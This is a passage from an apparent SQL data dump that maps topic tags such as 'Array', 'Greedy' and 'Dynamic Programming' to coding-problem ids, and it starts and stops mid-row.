Table',2131),(6286,'String',2131),(6287,'Greedy',2131),(6288,'Counting',2131),(6289,'Array',2132),(6290,'Greedy',2132),(6291,'Matrix',2132),(6292,'Prefix Sum',2132),(6293,'Array',2133),(6294,'Hash Table',2133),(6295,'Matrix',2133),(6296,'Array',2134),(6297,'Sliding Window',2134),(6298,'Array',2135),(6299,'Hash Table',2135),(6300,'String',2135),(6301,'Bit Manipulation',2135),(6302,'Sorting',2135),(6303,'Array',2136),(6304,'Greedy',2136),(6305,'Sorting',2136),(6306,'Array',2137),(6307,'Binary Search',2137),(6308,'String',2138),(6309,'Simulation',2138),(6310,'Math',2139),(6311,'Greedy',2139),(6312,'Array',2140),(6313,'Dynamic Programming',2140),(6314,'Array',2141),(6315,'Binary Search',2141),(6316,'Greedy',2141),(6317,'Sorting',2141),(6318,'Database',2142),(6319,'Array',2143),(6320,'Dynamic Programming',2143),(6321,'Array',2144),(6322,'Greedy',2144),(6323,'Sorting',2144),(6324,'Array',2145),(6325,'Prefix Sum',2145),(6326,'Array',2146),(6327,'Breadth-First Search',2146),(6328,'Sorting',2146),(6329,'Heap (Priority Queue)',2146),(6330,'Matrix',2146),(6331,'Math',2147),(6332,'String',2147),(6333,'Dynamic Programming',2147),(6334,'Array',2148),(6335,'Sorting',2148),(6336,'Array',2149),(6337,'Two Pointers',2149),(6338,'Simulation',2149),(6339,'Array',2150),(6340,'Hash Table',2150),(6341,'Counting',2150),(6342,'Array',2151),(6343,'Backtracking',2151),(6344,'Bit Manipulation',2151),(6345,'Enumeration',2151),(6346,'Array',2152),(6347,'Hash Table',2152),(6348,'Math',2152),(6349,'Dynamic Programming',2152),(6350,'Backtracking',2152),(6351,'Bit Manipulation',2152),(6352,'Geometry',2152),(6353,'Bitmask',2152),(6354,'Database',2153),(6355,'Array',2154),(6356,'Hash Table',2154),(6357,'Sorting',2154),(6358,'Simulation',2154),(6359,'Array',2155),(6360,'String',2156),(6361,'Sliding Window',2156),(6362,'Rolling Hash',2156),(6363,'Hash Function',2156),(6364,'String',2157),(6365,'Bit Manipulation',2157),(6366,'Union Find',2157),(6367,'Array',2158),(6368,'Segment Tree',2158),(6369,'Ordered Set',2158),(6370,'Database',2159),(6371,'Math',2160),(6372,'Greedy',2160),(6373,'Sorting',2160),(6374,'Array',2161),(6375,'Two Pointers',2161),(6376,'Simulation',2161),(6377,'Math',2162),(6378,'Enumeration',2162),(6379,'Array',2163),(6380,'Dynamic Programming',2163),(6381,'Heap (Priority Queue)',2163),(6382,'Array',2164),(6383,'Sorting',2164),(6384,'Math',2165),(6385,'Sorting',2165),(6386,'Array',2166),(6387,'Hash Table',2166),(6388,'Design',2166),(6389,'String',2167),(6390,'Dynamic Programming',2167),(6391,'Hash Table',2168),(6392,'String',2168),(6393,'Rolling Hash',2168),(6394,'Counting',2168),(6395,'Hash Function',2168),(6396,'Math',2169),(6397,'Simulation',2169),(6398,'Array',2170),(6399,'Hash Table',2170),(6400,'Greedy',2170),(6401,'Counting',2170),(6402,'Array',2171),(6403,'Sorting',2171),(6404,'Prefix Sum',2171),(6405,'Array',2172),(6406,'Dynamic Programming',2172),(6407,'Bit Manipulation',2172),(6408,'Bitmask',2172),(6409,'Database',2173),(6410,'Array',2174),(6411,'Bit Manipulation',2174),(6412,'Breadth-First Search',2174),(6413,'Matrix',2174),(6414,'Database',2175),(6415,'Array',2176),(6416,'Math',2177),(6417,'Simulation',2177),(6418,'Math',2178),(6419,'Backtracking',2178),(6420,'Greedy',2178),(6421,'Array',2179),(6422,'Binary Search',2179),(6423,'Divide and Conquer',2179),(6424,'Binary Indexed Tree',2179),(6425,'Segment Tree',2179),(6426,'Merge Sort',2179),(6427,'Ordered Set',2179),(6428,'Math',2180),(6429,'Simulation',2180),(6430,'Linked List',2181),(6431,'Simulation',2181),(6432,'String',2182),(6433,'Greedy',2182),(6434,'Heap (Priority Queue)',2182),(6435,'Counting',2182),(6436,'Array',2183),(6437,'Math',2183),(6438,'Number Theory',2183),(6439,'Array',2184),(6440,'Dynamic Programming',2184),(6441,'Bit Manipulation',2184),(6442,'Bitmask',2184),(6443,'Array',2185),(6444,'String',2185),(6445,'Hash Table',2186),(6446,'String',2186),(6447,'Counting',2186),(6448,'Array',2187),(6449,'Binary Search',2187),(6450,'Array',2188),(6451,'Dynamic Programming',2188),(6452,'Math',2189),(6453,'Dynamic Programming',2189),(6454,'Array',2190),(6455,'Hash Table',2190),(6456,'Counting',2190),(6457,'Array',2191),(6458,'Sorting',2191),(6459,'Depth-First Search',2192),(6460,'Breadth-First Search',2192),(6461,'Graph',2192),(6462,'Topological Sort',2192),(6463,'Two Pointers',2193),(6464,'String',2193),(6465,'Greedy',2193),(6466,'Binary Indexed Tree',2193),(6467,'String',2194),(6468,'Array',2195),(6469,'Math',2195),(6470,'Greedy',2195),(6471,'Sorting',2195),(6472,'Array',2196),(6473,'Hash Table',2196),(6474,'Tree',2196),(6475,'Depth-First Search',2196),(6476,'Breadth-First Search',2196),(6477,'Binary Tree',2196),(6478,'Array',2197),(6479,'Math',2197),(6480,'Stack',2197),(6481,'Number Theory',2197),(6482,'Math',2198),(6483,'Database',2199),(6484,'Array',2200),(6485,'Array',2201),(6486,'Hash Table',2201),(6487,'Simulation',2201),(6488,'Array',2202),(6489,'Greedy',2202),(6490,'Graph',2203),(6491,'Shortest Path',2203),(6492,'Depth-First Search',2204),(6493,'Breadth-First Search',2204),(6494,'Union Find',2204),(6495,'Graph',2204),(6496,'Database',2205),(6497,'Array',2206),(6498,'Hash Table',2206),(6499,'Bit Manipulation',2206),(6500,'Counting',2206),(6501,'String',2207),(6502,'Greedy',2207),(6503,'Prefix Sum',2207),(6504,'Array',2208),(6505,'Greedy',2208),(6506,'Heap (Priority Queue)',2208),(6507,'String',2209),(6508,'Dynamic Programming',2209),(6509,'Prefix Sum',2209),(6510,'Array',2210),(6511,'String',2211),(6512,'Stack',2211),(6513,'Array',2212),(6514,'Backtracking',2212),(6515,'Bit Manipulation',2212),(6516,'Enumeration',2212),(6517,'Array',2213),(6518,'String',2213),(6519,'Segment Tree',2213),(6520,'Ordered Set',2213),(6521,'Array',2214),(6522,'Greedy',2214),(6523,'Prefix Sum',2214),(6524,'Array',2215),(6525,'Hash Table',2215),(6526,'Array',2216),(6527,'Stack',2216),(6528,'Greedy',2216),(6529,'Array',2217),(6530,'Math',2217),(6531,'Array',2218),(6532,'Dynamic Programming',2218),(6533,'Prefix Sum',2218),(6534,'Array',2219),(6535,'Prefix Sum',2219),(6536,'Bit Manipulation',2220),(6537,'Array',2221),(6538,'Math',2221),(6539,'Simulation',2221),(6540,'Combinatorics',2221),(6541,'String',2222),(6542,'Dynamic Programming',2222),(6543,'Prefix Sum',2222),(6544,'String',2223),(6545,'Binary Search',2223),(6546,'Rolling Hash',2223),(6547,'Suffix Array',2223),(6548,'String Matching',2223),(6549,'Hash Function',2223),(6550,'String',2224),(6551,'Greedy',2224),(6552,'Array',2225),(6553,'Hash Table',2225),(6554,'Sorting',2225),(6555,'Counting',2225),(6556,'Array',2226),(6557,'Binary Search',2226),(6558,'Array',2227),(6559,'Hash Table',2227),(6560,'String',2227),(6561,'Design',2227),(6562,'Trie',2227),(6563,'Database',2228),(6564,'Array',2229),(6565,'Database',2230),(6566,'Sorting',2231),(6567,'Heap (Priority Queue)',2231),(6568,'String',2232),(6569,'Enumeration',2232),(6570,'Array',2233),(6571,'Greedy',2233),(6572,'Heap (Priority Queue)',2233),(6573,'Array',2234),(6574,'Two Pointers',2234),(6575,'Binary Search',2234),(6576,'Greedy',2234),(6577,'Sorting',2234),(6578,'Math',2235),(6579,'Tree',2236),(6580,'Binary Tree',2236),(6581,'Array',2237),(6582,'Prefix Sum',2237),(6583,'Database',2238),(6584,'Array',2239),(6585,'Math',2240),(6586,'Enumeration',2240),(6587,'Array',2241),(6588,'Greedy',2241),(6589,'Design',2241),(6590,'Array',2242),(6591,'Graph',2242),(6592,'Sorting',2242),(6593,'Enumeration',2242),(6594,'String',2243),(6595,'Simulation',2243),(6596,'Array',2244),(6597,'Hash Table',2244),(6598,'Greedy',2244),(6599,'Counting',2244),(6600,'Array',2245),(6601,'Matrix',2245),(6602,'Prefix Sum',2245),(6603,'Array',2246),(6604,'String',2246),(6605,'Tree',2246),(6606,'Depth-First Search',2246),(6607,'Graph',2246),(6608,'Topological Sort',2246),(6609,'Dynamic Programming',2247),(6610,'Bit Manipulation',2247),(6611,'Graph',2247),(6612,'Bitmask',2247),(6613,'Array',2248),(6614,'Hash Table',2248),(6615,'Counting',2248),(6616,'Array',2249),(6617,'Hash Table',2249),(6618,'Math',2249),(6619,'Geometry',2249),(6620,'Enumeration',2249),(6621,'Array',2250),(6622,'Binary Search',2250),(6623,'Binary Indexed Tree',2250),(6624,'Sorting',2250),(6625,'Array',2251),(6626,'Hash Table',2251),(6627,'Binary Search',2251),(6628,'Sorting',2251),(6629,'Prefix Sum',2251),(6630,'Ordered Set',2251),(6631,'Database',2252),(6632,'Database',2253),(6633,'Hash Table',2254),(6634,'Stack',2254),(6635,'Design',2254),(6636,'Ordered Set',2254),(6637,'Array',2255),(6638,'String',2255),(6639,'Array',2256),(6640,'Prefix Sum',2256),(6641,'Array',2257),(6642,'Matrix',2257),(6643,'Simulation',2257),(6644,'Array',2258),(6645,'Binary Search',2258),(6646,'Breadth-First Search',2258),(6647,'Matrix',2258),(6648,'String',2259),(6649,'Greedy',2259),(6650,'Enumeration',2259),(6651,'Array',2260),(6652,'Hash Table',2260),(6653,'Sliding Window',2260),(6654,'Array',2261),(6655,'Hash Table',2261),(6656,'Trie',2261),(6657,'Rolling Hash',2261),(6658,'Hash Function',2261),(6659,'Enumeration',2261),(6660,'Hash Table',2262),(6661,'String',2262),(6662,'Dynamic Programming',2262),(6663,'Dynamic Programming',2263),(6664,'Greedy',2263),(6665,'String',2264),(6666,'Tree',2265),(6667,'Depth-First Search',2265),(6668,'Binary Tree',2265),(6669,'Hash Table',2266),(6670,'Math',2266),(6671,'String',2266),(6672,'Dynamic Programming',2266),(6673,'Array',2267),(6674,'Dynamic Programming',2267),(6675,'Matrix',2267),(6676,'Array',2268),(6677,'String',2268),(6678,'Greedy',2268),(6679,'Sorting',2268),(6680,'Counting',2268),(6681,'Math',2269),(6682,'String',2269),(6683,'Sliding Window',2269),(6684,'Array',2270),(6685,'Prefix Sum',2270),(6686,'Array',2271),(6687,'Binary Search',2271),(6688,'Greedy',2271),(6689,'Sorting',2271),(6690,'Prefix Sum',2271),(6691,'Array',2272),(6692,'Dynamic Programming',2272),(6693,'Array',2273),(6694,'Hash Table',2273),(6695,'String',2273),(6696,'Sorting',2273),(6697,'Array',2274),(6698,'Sorting',2274),(6699,'Array',2275),(6700,'Hash Table',2275),(6701,'Bit Manipulation',2275),(6702,'Counting',2275),(6703,'Design',2276),(6704,'Segment Tree',2276),(6705,'Ordered Set',2276),(6706,'Array',2277),(6707,'Tree',2277),(6708,'Depth-First Search',2277),(6709,'Breadth-First Search',2277),(6710,'String',2278),(6711,'Array',2279),(6712,'Greedy',2279),(6713,'Sorting',2279),(6714,'Array',2280),(6715,'Math',2280),(6716,'Geometry',2280),(6717,'Sorting',2280),(6718,'Number Theory',2280),(6719,'Array',2281),(6720,'Stack',2281),(6721,'Monotonic Stack',2281),(6722,'Prefix Sum',2281),(6723,'Array',2282),(6724,'Stack',2282),(6725,'Matrix',2282),(6726,'Monotonic Stack',2282),(6727,'Hash Table',2283),(6728,'String',2283),(6729,'Counting',2283),(6730,'Array',2284),(6731,'Hash Table',2284),(6732,'String',2284),(6733,'Counting',2284),(6734,'Greedy',2285),(6735,'Graph',2285),(6736,'Sorting',2285),(6737,'Heap (Priority Queue)',2285),(6738,'Binary Search',2286),(6739,'Design',2286),(6740,'Binary Indexed Tree',2286),(6741,'Segment Tree',2286),(6742,'Hash Table',2287),(6743,'String',2287),(6744,'Counting',2287),(6745,'String',2288),(6746,'Array',2289),(6747,'Linked List',2289),(6748,'Stack',2289),(6749,'Monotonic Stack',2289),(6750,'Array',2290),(6751,'Breadth-First Search',2290),(6752,'Graph',2290),(6753,'Heap (Priority Queue)',2290),(6754,'Matrix',2290),(6755,'Shortest Path',2290),(6756,'Array',2291),(6757,'Dynamic Programming',2291),(6758,'Database',2292),(6759,'Array',2293),(6760,'Simulation',2293),(6761,'Array',2294),(6762,'Greedy',2294),(6763,'Sorting',2294),(6764,'Array',2295),(6765,'Hash Table',2295),(6766,'Simulation',2295),(6767,'Linked List',2296),(6768,'String',2296),(6769,'Stack',2296),(6770,'Design',2296),(6771,'Simulation',2296),(6772,'Doubly-Linked List',2296),(6773,'Array',2297),(6774,'Dynamic Programming',2297),(6775,'Stack',2297),(6776,'Graph',2297),(6777,'Monotonic Stack',2297),(6778,'Shortest Path',2297),(6779,'Database',2298),(6780,'String',2299),(6781,'Array',2300),(6782,'Two Pointers',2300),(6783,'Binary Search',2300),(6784,'Sorting',2300),(6785,'Array',2301),(6786,'Hash Table',2301),(6787,'String',2301),(6788,'String Matching',2301),(6789,'Array',2302),(6790,'Binary Search',2302),(6791,'Sliding Window',2302),(6792,'Prefix Sum',2302),(6793,'Array',2303),(6794,'Simulation',2303),(6795,'Array',2304),(6796,'Dynamic Programming',2304),(6797,'Matrix',2304),(6798,'Array',2305),(6799,'Dynamic Programming',2305),(6800,'Backtracking',2305),(6801,'Bit Manipulation',2305),(6802,'Bitmask',2305),(6803,'Array',2306),(6804,'Hash Table',2306),(6805,'String',2306),(6806,'Bit Manipulation',2306),(6807,'Enumeration',2306),(6808,'Array',2307),(6809,'Depth-First Search',2307),(6810,'Union Find',2307),(6811,'Graph',2307),(6812,'Database',2308),(6813,'Hash Table',2309),(6814,'String',2309),(6815,'Enumeration',2309),(6816,'Math',2310),(6817,'Dynamic Programming',2310),(6818,'Greedy',2310),(6819,'Enumeration',2310),(6820,'String',2311),(6821,'Dynamic Programming',2311),(6822,'Greedy',2311),(6823,'Memoization',2311),(6824,'Array',2312),(6825,'Dynamic Programming',2312),(6826,'Memoization',2312),(6827,'Dynamic Programming',2313),(6828,'Tree',2313),(6829,'Depth-First Search',2313),(6830,'Binary Tree',2313),(6831,'Database',2314),(6832,'String',2315),(6833,'Depth-First Search',2316),(6834,'Breadth-First Search',2316),(6835,'Union Find',2316),(6836,'Graph',2316),(6837,'Array',2317),(6838,'Math',2317),(6839,'Bit Manipulation',2317),(6840,'Dynamic Programming',2318),(6841,'Memoization',2318),(6842,'Array',2319),(6843,'Matrix',2319),(6844,'Dynamic Programming',2320),(6845,'Array',2321),(6846,'Dynamic Programming',2321),(6847,'Array',2322),(6848,'Bit Manipulation',2322),(6849,'Tree',2322),(6850,'Depth-First Search',2322),(6851,'Array',2323),(6852,'Greedy',2323),(6853,'Sorting',2323),(6854,'Database',2324),(6855,'Hash Table',2325),(6856,'String',2325),(6857,'Array',2326),(6858,'Linked List',2326),(6859,'Matrix',2326),(6860,'Simulation',2326),(6861,'Dynamic Programming',2327),(6862,'Queue',2327),(6863,'Simulation',2327),(6864,'Array',2328),(6865,'Dynamic Programming',2328),(6866,'Depth-First Search',2328),(6867,'Breadth-First Search',2328),(6868,'Graph',2328),(6869,'Topological Sort',2328),(6870,'Memoization',2328),(6871,'Matrix',2328),(6872,'Database',2329),(6873,'Two Pointers',2330),(6874,'String',2330),(6875,'Tree',2331),(6876,'Depth-First Search',2331),(6877,'Array',2332),(6878,'Two Pointers',2332),(6879,'Binary Search',2332),(6880,'Sorting',2332),(6881,'Array',2333),(6882,'Math',2333),(6883,'Sorting',2333),(6884,'Heap (Priority Queue)',2333),(6885,'Array',2334),(6886,'Stack',2334),(6887,'Union Find',2334),(6888,'Monotonic Stack',2334),(6889,'Array',2335),(6890,'Greedy',2335),(6891,'Sorting',2335),(6892,'Heap (Priority Queue)',2335),(6893,'Hash Table',2336),(6894,'Design',2336),(6895,'Heap (Priority Queue)',2336),(6896,'Two Pointers',2337),(6897,'String',2337),(6898,'Math',2338),(6899,'Dynamic Programming',2338),(6900,'Combinatorics',2338),(6901,'Number Theory',2338),(6902,'Database',2339),(6903,'Array',2340),(6904,'Greedy',2340),(6905,'Array',2341),(6906,'Hash Table',2341),(6907,'Counting',2341),(6908,'Array',2342),(6909,'Hash Table',2342),(6910,'Sorting',2342),(6911,'Heap (Priority Queue)',2342),(6912,'Array',2343),(6913,'String',2343),(6914,'Divide and Conquer',2343),(6915,'Sorting',2343),(6916,'Heap (Priority Queue)',2343),(6917,'Radix Sort',2343),(6918,'Quickselect',2343),(6919,'Array',2344),(6920,'Math',2344),(6921,'Sorting',2344),(6922,'Heap (Priority Queue)',2344),(6923,'Number Theory',2344),(6924,'Array',2345),(6925,'Stack',2345),(6926,'Sorting',2345),(6927,'Monotonic Stack',2345),(6928,'Database',2346),(6929,'Array',2347),(6930,'Hash Table',2347),(6931,'Counting',2347),(6932,'Array',2348),(6933,'Math',2348),(6934,'Hash Table',2349),(6935,'Design',2349),(6936,'Heap (Priority Queue)',2349),(6937,'Ordered Set',2349),(6938,'Array',2350),(6939,'Hash Table',2350),(6940,'Greedy',2350),(6941,'Hash Table',2351),(6942,'String',2351),(6943,'Counting',2351),(6944,'Array',2352),(6945,'Hash Table',2352),(6946,'Matrix',2352),(6947,'Simulation',2352),(6948,'Hash Table',2353),(6949,'Design',2353),(6950,'Heap (Priority Queue)',2353),(6951,'Ordered Set',2353),(6952,'Array',2354),(6953,'Hash Table',2354),(6954,'Binary Search',2354),(6955,'Bit Manipulation',2354),(6956,'Array',2355),(6957,'Dynamic Programming',2355),(6958,'Stack',2355),(6959,'Monotonic Stack',2355),(6960,'Database',2356),(6961,'Array',2357),(6962,'Hash Table',2357),(6963,'Greedy',2357),(6964,'Sorting',2357),(6965,'Heap (Priority Queue)',2357),(6966,'Simulation',2357),(6967,'Array',2358),(6968,'Math',2358),(6969,'Binary Search',2358),(6970,'Greedy',2358),(6971,'Depth-First Search',2359),(6972,'Graph',2359),(6973,'Depth-First Search',2360),(6974,'Graph',2360),(6975,'Topological Sort',2360),(6976,'Array',2361),(6977,'Dynamic Programming',2361),(6978,'Database',2362),(6979,'Array',2363),(6980,'Hash Table',2363),(6981,'Sorting',2363),(6982,'Ordered Set',2363),(6983,'Array',2364),(6984,'Hash Table',2364),(6985,'Array',2365),(6986,'Hash Table',2365),(6987,'Simulation',2365),(6988,'Array',2366),(6989,'Math',2366),(6990,'Greedy',2366),(6991,'Array',2367),(6992,'Hash Table',2367),(6993,'Two Pointers',2367),(6994,'Enumeration',2367),(6995,'Array',2368),(6996,'Hash Table',2368),(6997,'Tree',2368),(6998,'Depth-First Search',2368),(6999,'Breadth-First Search',2368),(7000,'Graph',2368),(7001,'Array',2369),(7002,'Dynamic Programming',2369),(7003,'Hash Table',2370),(7004,'String',2370),(7005,'Dynamic Programming',2370),(7006,'Array',2371),(7007,'Union Find',2371),(7008,'Graph',2371),(7009,'Topological Sort',2371),(7010,'Sorting',2371),(7011,'Matrix',2371),(7012,'Database',2372),(7013,'Array',2373),(7014,'Matrix',2373),(7015,'Hash Table',2374),(7016,'Graph',2374),(7017,'String',2375),(7018,'Backtracking',2375),(7019,'Stack',2375),(7020,'Greedy',2375),(7021,'Math',2376),(7022,'Dynamic Programming',2376),(7023,'Database',2377),(7024,'Dynamic Programming',2378),(7025,'Tree',2378),(7026,'Depth-First Search',2378),(7027,'String',2379),(7028,'Sliding Window',2379),(7029,'String',2380),(7030,'Dynamic Programming',2380),(7031,'Simulation',2380),(7032,'Array',2381),(7033,'String',2381),(7034,'Prefix Sum',2381),(7035,'Array',2382),(7036,'Union Find',2382),(7037,'Prefix Sum',2382),(7038,'Ordered Set',2382),(7039,'Array',2383),(7040,'Greedy',2383),(7041,'Hash Table',2384),(7042,'String',2384),(7043,'Greedy',2384),(7044,'Tree',2385),(7045,'Depth-First Search',2385),(7046,'Breadth-First Search',2385),(7047,'Binary Tree',2385),(7048,'Array',2386),(7049,'Sorting',2386),(7050,'Heap (Priority Queue)',2386),(7051,'Array',2387),(7052,'Binary Search',2387),(7053,'Matrix',2387),(7054,'Database',2388),(7055,'Array',2389),(7056,'Binary Search',2389),(7057,'Greedy',2389),(7058,'Sorting',2389),(7059,'Prefix Sum',2389),(7060,'String',2390),(7061,'Stack',2390),(7062,'Simulation',2390),(7063,'Array',2391),(7064,'String',2391),(7065,'Prefix Sum',2391),(7066,'Array',2392),(7067,'Graph',2392),(7068,'Topological Sort',2392),(7069,'Matrix',2392),(7070,'Array',2393),(7071,'Math',2393),(7072,'Dynamic Programming',2393),(7073,'Database',2394),(7074,'Array',2395),(7075,'Hash Table',2395),(7076,'Math',2396),(7077,'Two Pointers',2396),(7078,'Brainteaser',2396),(7079,'Array',2397),(7080,'Backtracking',2397),(7081,'Bit Manipulation',2397),(7082,'Matrix',2397),(7083,'Enumeration',2397),(7084,'Array',2398),(7085,'Binary Search',2398),(7086,'Queue',2398),(7087,'Sliding Window',2398),(7088,'Heap (Priority Queue)',2398),(7089,'Prefix Sum',2398),(7090,'Array',2399),(7091,'Hash Table',2399),(7092,'String',2399),(7093,'Math',2400),(7094,'Dynamic Programming',2400),(7095,'Combinatorics',2400),(7096,'Array',2401),(7097,'Bit Manipulation',2401),(7098,'Sliding Window',2401),(7099,'Array',2402),(7100,'Hash Table',2402),(7101,'Sorting',2402),(7102,'Heap (Priority Queue)',2402),(7103,'Simulation',2402),(7104,'Array',2403),(7105,'Dynamic Programming',2403),(7106,'Bit Manipulation',2403),(7107,'Bitmask',2403),(7108,'Array',2404),(7109,'Hash Table',2404),(7110,'Counting',2404),(7111,'Hash Table',2405),(7112,'String',2405),(7113,'Greedy',2405),(7114,'Array',2406),(7115,'Two Pointers',2406),(7116,'Greedy',2406),(7117,'Sorting',2406),(7118,'Heap (Priority Queue)',2406),(7119,'Prefix Sum',2406),(7120,'Array',2407),(7121,'Divide and Conquer',2407),(7122,'Dynamic Programming',2407),(7123,'Binary Indexed Tree',2407),(7124,'Segment Tree',2407),(7125,'Queue',2407),(7126,'Monotonic Queue',2407),(7127,'Array',2408),(7128,'Hash Table',2408),(7129,'String',2408),(7130,'Design',2408),(7131,'Math',2409),(7132,'String',2409),(7133,'Array',2410),(7134,'Two Pointers',2410),(7135,'Greedy',2410),(7136,'Sorting',2410),(7137,'Array',2411),(7138,'Binary Search',2411),(7139,'Bit Manipulation',2411),(7140,'Sliding Window',2411),(7141,'Array',2412),(7142,'Greedy',2412),(7143,'Sorting',2412),(7144,'Math',2413),(7145,'Number Theory',2413),(7146,'String',2414),(7147,'Tree',2415),(7148,'Depth-First Search',2415),(7149,'Breadth-First Search',2415),(7150,'Binary Tree',2415),(7151,'Array',2416),(7152,'String',2416),(7153,'Trie',2416),(7154,'Counting',2416),(7155,'Math',2417),(7156,'Enumeration',2417),(7157,'Array',2418),(7158,'Hash Table',2418),(7159,'String',2418),(7160,'Sorting',2418),(7161,'Array',2419),(7162,'Bit Manipulation',2419),(7163,'Brainteaser',2419),(7164,'Array',2420),(7165,'Dynamic Programming',2420),(7166,'Prefix Sum',2420),(7167,'Array',2421),(7168,'Hash Table',2421),(7169,'Tree',2421),(7170,'Union Find',2421),(7171,'Graph',2421),(7172,'Sorting',2421),(7173,'Array',2422),(7174,'Two Pointers',2422),(7175,'Greedy',2422),(7176,'Hash Table',2423),(7177,'String',2423),(7178,'Counting',2423),(7179,'Binary Search',2424),(7180,'Union Find',2424),(7181,'Design',2424),(7182,'Binary Indexed Tree',2424),(7183,'Segment Tree',2424),(7184,'Heap (Priority Queue)',2424),(7185,'Ordered Set',2424),(7186,'Array',2425),(7187,'Bit Manipulation',2425),(7188,'Brainteaser',2425),(7189,'Array',2426),(7190,'Binary Search',2426),(7191,'Divide and Conquer',2426),(7192,'Binary Indexed Tree',2426),(7193,'Segment Tree',2426),(7194,'Merge Sort',2426),(7195,'Ordered Set',2426),(7196,'Math',2427),(7197,'Enumeration',2427),(7198,'Number Theory',2427),(7199,'Array',2428),(7200,'Matrix',2428),(7201,'Prefix Sum',2428),(7202,'Greedy',2429),(7203,'Bit Manipulation',2429),(7204,'String',2430),(7205,'Dynamic Programming',2430),(7206,'Rolling Hash',2430),(7207,'String Matching',2430),(7208,'Hash Function',2430),(7209,'Array',2431),(7210,'Dynamic Programming',2431),(7211,'Array',2432),(7212,'Array',2433),(7213,'Bit Manipulation',2433),(7214,'Hash Table',2434),(7215,'String',2434),(7216,'Stack',2434),(7217,'Greedy',2434),(7218,'Array',2435),(7219,'Dynamic Programming',2435),(7220,'Matrix',2435),(7221,'Array',2436),(7222,'Math',2436),(7223,'Dynamic Programming',2436),(7224,'Greedy',2436),(7225,'Number Theory',2436),(7226,'String',2437),(7227,'Enumeration',2437),(7228,'Array',2438),(7229,'Bit Manipulation',2438),(7230,'Prefix Sum',2438),(7231,'Array',2439),(7232,'Binary Search',2439),(7233,'Dynamic Programming',2439),(7234,'Greedy',2439),(7235,'Prefix Sum',2439),(7236,'Array',2440),(7237,'Math',2440),(7238,'Tree',2440),(7239,'Depth-First Search',2440),(7240,'Enumeration',2440),(7241,'Array',2441),(7242,'Hash Table',2441),(7243,'Two Pointers',2441),(7244,'Sorting',2441),(7245,'Array',2442),(7246,'Hash Table',2442),(7247,'Math',2442),(7248,'Math',2443),(7249,'Enumeration',2443),(7250,'Array',2444),(7251,'Queue',2444),(7252,'Sliding Window',2444),(7253,'Monotonic Queue',2444),(7254,'Tree',2445),(7255,'Depth-First Search',2445),(7256,'Breadth-First Search',2445),(7257,'Binary Tree',2445),(7258,'Array',2446),(7259,'String',2446),(7260,'Array',2447),(7261,'Math',2447),(7262,'Number Theory',2447),(7263,'Array',2448),(7264,'Binary Search',2448),(7265,'Greedy',2448),(7266,'Sorting',2448),(7267,'Prefix Sum',2448),(7268,'Array',2449),(7269,'Greedy',2449),(7270,'Sorting',2449),(7271,'Math',2450),(7272,'String',2450),(7273,'Array',2451),(7274,'Hash Table',2451),(7275,'String',2451),(7276,'Array',2452),(7277,'String',2452),(7278,'Array',2453),(7279,'Hash Table',2453),(7280,'Counting',2453),(7281,'Array',2454),(7282,'Binary Search',2454),(7283,'Stack',2454),(7284,'Sorting',2454),(7285,'Heap (Priority Queue)',2454),(7286,'Monotonic Stack',2454),(7287,'Array',2455),(7288,'Math',2455),(7289,'Array',2456),(7290,'Hash Table',2456),(7291,'String',2456),(7292,'Sorting',2456),(7293,'Heap (Priority Queue)',2456),(7294,'Math',2457),(7295,'Greedy',2457),(7296,'Array',2458),(7297,'Tree',2458),(7298,'Depth-First Search',2458),(7299,'Breadth-First Search',2458),(7300,'Binary Tree',2458),(7301,'Array',2459),(7302,'Greedy',2459),(7303,'Sorting',2459),(7304,'Array',2460),(7305,'Simulation',2460),(7306,'Array',2461),(7307,'Hash Table',2461),(7308,'Sliding Window',2461),(7309,'Array',2462),(7310,'Two Pointers',2462),(7311,'Heap (Priority Queue)',2462),(7312,'Simulation',2462),(7313,'Array',2463),(7314,'Dynamic Programming',2463),(7315,'Sorting',2463),(7316,'Array',2464),(7317,'Math',2464),(7318,'Dynamic Programming',2464),(7319,'Number Theory',2464),(7320,'Array',2465),(7321,'Hash Table',2465),(7322,'Two Pointers',2465),(7323,'Sorting',2465),(7324,'Dynamic Programming',2466),(7325,'Array',2467),(7326,'Tree',2467),(7327,'Depth-First Search',2467),(7328,'Breadth-First Search',2467),(7329,'Graph',2467),(7330,'String',2468),(7331,'Binary Search',2468),(7332,'Math',2469),(7333,'Array',2470),(7334,'Math',2470),(7335,'Number Theory',2470),(7336,'Tree',2471),(7337,'Breadth-First Search',2471),(7338,'Binary Tree',2471),(7339,'String',2472),(7340,'Dynamic Programming',2472),(7341,'Array',2473),(7342,'Graph',2473),(7343,'Heap (Priority Queue)',2473),(7344,'Shortest Path',2473),(7345,'Database',2474),(7346,'Array',2475),(7347,'Hash Table',2475),(7348,'Array',2476),(7349,'Binary Search',2476),(7350,'Tree',2476),(7351,'Depth-First Search',2476),(7352,'Binary Tree',2476),(7353,'Tree',2477),(7354,'Depth-First Search',2477),(7355,'Breadth-First Search',2477),(7356,'Graph',2477),(7357,'String',2478),(7358,'Dynamic Programming',2478),(7359,'Tree',2479),(7360,'Depth-First Search',2479),(7361,'Graph',2479),(7362,'Trie',2479),(7363,'Database',2480),(7364,'Math',2481),(7365,'Geometry',2481),(7366,'Array',2482),(7367,'Matrix',2482),(7368,'Simulation',2482),(7369,'String',2483),(7370,'Prefix Sum',2483),(7371,'String',2484),(7372,'Dynamic Programming',2484),(7373,'Math',2485),(7374,'Prefix Sum',2485),(7375,'Two Pointers',2486),(7376,'String',2486),(7377,'Greedy',2486),(7378,'Linked List',2487),(7379,'Stack',2487),(7380,'Recursion',2487),(7381,'Monotonic Stack',2487),(7382,'Array',2488),(7383,'Hash Table',2488),(7384,'Prefix Sum',2488),(7385,'Hash Table',2489),(7386,'Math',2489),(7387,'String',2489),(7388,'Prefix Sum',2489),(7389,'String',2490),(7390,'Array',2491),(7391,'Hash Table',2491),(7392,'Two Pointers',2491),(7393,'Sorting',2491),(7394,'Depth-First Search',2492),(7395,'Breadth-First Search',2492),(7396,'Union Find',2492),(7397,'Graph',2492),(7398,'Breadth-First Search',2493),(7399,'Union Find',2493),(7400,'Graph',2493),(7401,'Database',2494),(7402,'Array',2495),(7403,'Math',2495),(7404,'Dynamic Programming',2495),(7405,'Array',2496),(7406,'String',2496),(7407,'Array',2497),(7408,'Greedy',2497),(7409,'Graph',2497),(7410,'Sorting',2497),(7411,'Heap (Priority Queue)',2497),(7412,'Array',2498),(7413,'Binary Search',2498),(7414,'Greedy',2498),(7415,'Array',2499),(7416,'Hash 